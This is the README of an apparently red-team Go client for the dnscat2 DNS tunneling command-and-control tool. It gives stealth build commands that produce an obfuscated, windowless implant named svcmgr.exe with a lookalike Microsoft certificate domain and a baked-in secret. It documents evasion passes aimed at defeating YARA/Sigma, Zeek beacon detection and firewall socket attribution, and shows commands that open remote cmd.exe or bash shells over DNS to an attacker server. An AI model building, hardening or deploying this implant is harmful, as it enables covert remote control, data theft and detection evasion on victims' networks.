# dnscat2 Go Client

A Golang implementation of the dnscat2 client, fully compatible with the original Ruby server.

## Features

- ✅ Full protocol compatibility with dnscat2 server
- ✅ ECDH + Salsa20 + SHA3 encryption
- ✅ Command protocol (shell, exec, upload, download, tunnel)
- ✅ Multiple DNS record types (TXT, CNAME, MX, A, AAAA)
- ✅ Cross-platform (Windows, Linux, macOS)
- ✅ Single binary, no dependencies
- ✅ Windows DNS auto-detection via registry (domain-joined environments)
- ✅ DNS label entropy reduction (20-char cap per label, C)
- ✅ Adaptive beacon jitter — 1–3 s active, 5–30 s idle (D+E)
- ✅ DnsQuery_W transport (`cmd/dnscat-dnsapi`) — DNS Client service owns UDP/53 socket; binary never opens raw socket

## Building

**Operational build — raw UDP socket (`cmd/dnscat`):**

```powershell
go build -tags stealth -trimpath `
    -ldflags="-s -w -buildid= -H windowsgui `
      -X main.DefaultDomain=crl.ms-cert.net `
      -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e `
      -X main.DefaultServer=192.168.56.2 `
      -X main.DefaultDNSTypes=A,CNAME" `
    -o svcmgr.exe ./cmd/dnscat/
```

**Operational build — DnsQuery_W transport (`cmd/dnscat-dnsapi`, Windows only):**

```powershell
go build -tags stealth -trimpath `
    -ldflags="-s -w -buildid= -H windowsgui `
      -X main.DefaultDomain=crl.ms-cert.net `
      -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e `
      -X main.DefaultServer=192.168.56.2 `
      -X main.DefaultDNSTypes=A,CNAME" `
    -o svcmgr.exe ./cmd/dnscat-dnsapi/
```

Same flags as above. `--dns-server` / `DefaultServer` is stored for API compatibility but not passed to `DnsQuery_W`; the system resolver is always used. Deploy with a conditional forwarder on DC pointing `crl.ms-cert.net` → attacker server, or set system DNS on the target to the dnscat2 server for testing.

| Flag | Effect |
|---|---|
| `-tags stealth` | Enables string obfuscation (XOR-encoded literals, dynamic API names) |
| `-trimpath` | Removes source file paths from binary |
| `-buildid=` | Strips Go build ID |
| `-H windowsgui` | No console window on launch |
| `-X main.DefaultDomain` | Tunnel domain (requires conditional forwarder on DC) |
| `-X main.DefaultServer` | Fallback direct server IP if domain mode fails |
| `-X main.DefaultDNSTypes=A,CNAME` | Low-entropy record types; avoids TXT which is flagged aggressively |

For development/debug builds:

```bash
go build -o dnscat2 ./cmd/dnscat/
```

**Full standalone payload options:** See [BUILD.md](BUILD.md)

## Traffic Evasion

Three hardening passes reduce detection surface against DNS-based network signatures.

### C — DNS label entropy reduction

`MaxLabelLength = 20` (down from the RFC max of 62).

Each hex-encoded label is capped at 20 characters before a dot is inserted. A 60-byte payload that would produce a single 120-char label is now split across 6 labels of ≤20 chars each. This kills YARA/Sigma rules that flag long high-entropy labels (typical threshold: >50 chars or Shannon entropy >3.5 over a single label).

Server-transparent: the server strips dots, then hex-decodes the concatenated string — label boundaries are irrelevant.

### D — Adaptive beacon jitter

Replaces the fixed `PacketDelay = 1000 ms` constant with a gated `nextSend` timer at the DNS driver level.

| Condition | Interval |
|---|---|
| Active (shell output queued) | 1000 + rand(0..2000) ms |
| Idle (no application data) | 5 + rand(0..25) s |
| Response-triggered | Immediate (bypasses gate) |

Kills fixed-interval beacon signatures (e.g. Zeek `dns_query_interval` detectors).

### F — DnsQuery_W transport (network-layer socket attribution)

`cmd/dnscat-dnsapi` routes DNS queries through the Windows DNS Client API (`dnsapi.dll!DnsQuery_W`) instead of opening a raw UDP socket.

| | Raw UDP (`cmd/dnscat`) | DnsQuery_W (`cmd/dnscat-dnsapi`) |
|---|---|---|
| UDP/53 socket owner | binary process | `svchost.exe` (Dnscache service) |
| NDR / firewall socket rules | binary visible | binary not visible |
| Sysmon Event 22 (DNSEvent) | binary PID logged | binary PID logged |

**Limitation:** `DnsQuery_W` always uses the system resolver; the `--dns-server` flag is informational only. Domain mode (conditional forwarder on DC) is the intended deployment.

**Server-side behavior:** The dnscat2 Ruby server's dedup cache (`--cache`, default on) is exercised more often with this transport because `DnsQuery_W` retransmits internally if the response is slow. This is normal and harmless — the server replies from cache without reprocessing the packet.

### E — Burst pattern / idle detection

Without this fix, even an idle session generates a keep-alive MSG every 1–3 s because `session.GetOutgoing()` always returns non-nil bytes in `StateEstablished`.

Fix: `HasPendingData()` chain (`controller → session`) polls the exec/console driver into `OutgoingBuffer`, then checks `len(OutgoingBuffer) > 0`. The beacon path uses `scheduleNext(sent && hasData)` — only schedules at 1–3 s when real application data was present. All other cases fall back to 5–30 s.

Result: traffic pattern is genuine burst-then-silence rather than a metronomic keep-alive stream.

## Usage

### Basic Usage

Connect to server with domain:

```bash
./dnscat2 example.com
```

Direct connection to server:

```bash
./dnscat2 --dns-server=192.168.1.2
```

With pre-shared secret:

```bash
./dnscat2 --dns-server=192.168.1.2 --secret=<secret>
```

### Common Options

| Option                | Description                            | Default      |
| --------------------- | -------------------------------------- | ------------ |
| `--dns-server=<host>` | DNS server IP address                  | System DNS (see below) |
| `--dns-port=<port>`   | DNS server port                        | 53           |
| `--dns-type=<types>`  | DNS record types (TXT,CNAME,MX,A,AAAA) | TXT,CNAME,MX |
| `--secret=<hex>`      | Pre-shared secret for authentication   | None         |
| `--no-encryption`     | Disable encryption                     | false        |
| `--delay=<ms>`        | Delay between packets                  | 1000         |
| `--packet-trace`      | Enable packet tracing                  | false        |
| `--console`           | Start console session                  | false        |
| `--exec=<cmd>`        | Execute command/shell                  | None         |
| `--ping`              | Ping mode                              | false        |

### Examples

**Interactive shell (Windows):**

```bash
dnscat2.exe --dns-server=192.168.1.2 --secret=<secret> --exec=cmd.exe
```

**Interactive shell (Linux):**

```bash
./dnscat2 --dns-server=192.168.1.2 --secret=<secret> --exec=/bin/bash
```

**Command session (default):**

```bash
./dnscat2 --dns-server=192.168.1.2 --secret=<secret>
```

**Ping test:**

```bash
./dnscat2 --dns-server=192.168.1.2 --ping
```

## Server Side

Start the dnscat2 server:

```bash
ruby dnscat2.rb --dns host=0.0.0.0,port=53,domain=example.com --secret=<secret>
```

Server commands:

- `windows` - List sessions
- `window -i <id>` - Interact with session
- `shell` - Spawn a shell
- `exec <command>` - Execute a command
- `download <file>` - Download file from client
- `upload <local> <remote>` - Upload file to client
- `listen <port>` - Create tunnel listener
- `ping` - Test connection

## Architecture

```
cmd/dnscat/                  - Raw UDP transport entry point
  ├── main.go                - CLI flags, session setup, DNS driver bootstrap
  ├── getdns_windows.go      - Windows DNS resolver: reads registry (build tag: windows)
  └── getdns_unix.go         - Unix DNS resolver: reads /etc/resolv.conf (build tag: !windows)
cmd/dnscat-dnsapi/           - DnsQuery_W transport entry point (Windows only; cross-compiles via stub)
  ├── main.go                - Same CLI interface; imports pkg/tunnel/dnsapi instead of pkg/tunnel/dns
  ├── getdns_windows.go      - (same as cmd/dnscat)
  └── getdns_unix.go         - (same as cmd/dnscat)
cmd/dnscat-service/          - Windows Service wrapper (platform-specific files use //go:build windows)
pkg/
  ├── protocol/              - dnscat2 protocol packets (SYN, MSG, FIN, ENC, PING)
  ├── crypto/                - Encryption layer (ECDH, Salsa20, SHA3)
  ├── session/               - Session state machine
  ├── controller/            - Session management
  ├── driver/                - Application drivers
  │   ├── console.go         - Console driver
  │   ├── exec.go            - Process execution driver
  │   ├── ping.go            - Ping driver
  │   └── command/           - Command protocol driver
  └── tunnel/
      ├── dns/               - Raw UDP DNS transport
      └── dnsapi/            - DnsQuery_W transport (dnsapi.go: windows; stub.go: !windows)
```

## Protocol Compatibility

This Go client is fully compatible with the official dnscat2 server:

- ✅ Protocol version matching
- ✅ Encryption negotiation (ECDH, Salsa20, SHA3)
- ✅ Pre-shared secret authentication
- ✅ Command protocol (all commands supported)
- ✅ DNS encoding/decoding

## Differences from C Client

1. **Better cross-platform support** - No need for Cygwin on Windows
2. **Single binary** - No external library dependencies
3. **Concurrent I/O** - Uses goroutines instead of select()
4. **Memory safety** - No buffer overflows or memory leaks
5. **Modern crypto** - Uses Go's standard crypto libraries

## Security Notes

- Always use `--secret` with a strong random hex string
- The secret must match on both client and server
- Without `--secret`, connections use SAS verification (less secure)
- Use `--no-encryption` only for testing/debugging

## DNS Server Resolution

When `--dns-server` is not specified, the client selects a DNS server as follows:

1. **`DefaultServer` build-time override** — if `-ldflags "-X main.DefaultServer=<ip>"` was set at compile time, that value is used directly and `getSystemDNS()` is **not called**.
2. **`--dns-server` flag at runtime** — overrides everything.
3. **`getSystemDNS()` (Windows)** — `collectDNSServers()` performs two passes over all TCP/IP interface GUIDs under `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\`:
   - Pass 1: collect all `NameServer` values (static DNS) across every interface GUID.
   - Pass 2: collect all `DhcpNameServer` values (DHCP-assigned DNS) across every interface GUID.
   - Results are de-duplicated; `0.0.0.0` entries are skipped.
   - The first entry from the combined list is returned.
4. **Fallback** — `8.8.8.8` if all of the above yield nothing.

| Platform | Source | Fallback |
|---|---|---|
| **Windows** | Pass 1: `NameServer` (static) across all interfaces; Pass 2: `DhcpNameServer` (DHCP) across all interfaces — de-duplicated, `0.0.0.0` skipped, first result returned | `8.8.8.8` |
| **Linux / macOS** | First `nameserver` entry in `/etc/resolv.conf` | `8.8.8.8` |

On domain-joined Windows machines the static `NameServer` typically contains the DC's IP (e.g. `10.12.10.10`), enabling **domain mode** tunneling through the internal DNS conditional forwarder without hardcoding an IP in the binary.

> **Note:** The registry key is readable by any user (standard `KEY_READ` ACL). No elevation required.

## Troubleshooting

**Connection fails:**

- Check DNS server is reachable: `nslookup example.com <dns-server>`
- Verify port 53 is not blocked
- Try different DNS types: `--dns-type=TXT` or `--dns-type=A`

**Secret mismatch:**

```
Their authenticator was wrong!
```

- Ensure both sides use the same `--secret` value
- Secret is case-sensitive hexadecimal

**Session closes immediately:**

- For interactive shells, use direct command: `--exec=cmd.exe` (not `--exec="echo cmd"` )
- Check server logs for errors

## Development

Run tests:

```bash
go test ./...
```

Build for multiple platforms:

```bash
# Linux
GOOS=linux GOARCH=amd64 go build -o dnscat2-linux ./cmd/dnscat/

# Windows
GOOS=windows GOARCH=amd64 go build -o dnscat2.exe ./cmd/dnscat/

# macOS
GOOS=darwin GOARCH=amd64 go build -o dnscat2-mac ./cmd/dnscat/
```

## License

See the main dnscat2 project LICENSE.md

## Credits

- Original dnscat2 by Ron Bowes (iagox86)
- Go implementation maintains protocol compatibility
- Based on the C client and Ruby server specifications
